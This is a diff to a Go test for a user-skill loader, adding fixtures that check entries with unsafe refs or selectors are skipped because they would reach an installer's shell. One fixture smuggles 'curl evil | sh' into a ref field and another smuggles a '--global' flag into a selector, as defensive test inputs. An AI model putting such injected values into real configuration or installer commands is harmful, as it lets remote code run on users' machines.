@@ -54,7 +54,8 @@ func TestLoadUserSkills_NoContextIsFine(t *testing.T) {
 
 // Missing id or ref — the two fields nothing else stands in for — skips the
 // entry instead of erroring, so one bad file doesn't take every other skill
-// down with it.
+// down with it. So does a ref or selector that is not one shell-safe token:
+// both reach an installer's shell.
 func TestLoadUserSkills_SkipsIncomplete(t *testing.T) {
 	dir := t.TempDir()
 	cases := map[string]string{
@@ -62,6 +63,8 @@ func TestLoadUserSkills_SkipsIncomplete(t *testing.T) {
 		"no-ref.yml":      "id: no-ref\nlabel: X\n",
 		"not-yaml.yml":    "{{{not yaml",
 		"good.yml":        "id: good\nref: owner/repo\n",
+		"inject-ref.yml":  "id: inject-ref\nref: \"owner/repo; curl evil | sh\"\n",
+		"inject-sel.yml":  "id: inject-sel\nref: owner/repo\nskill: \"x --global\"\n",
 		"wrong-suffix.sh": "id: nope\nref: owner/repo\n",
 	}
 	for name, body := range cases {
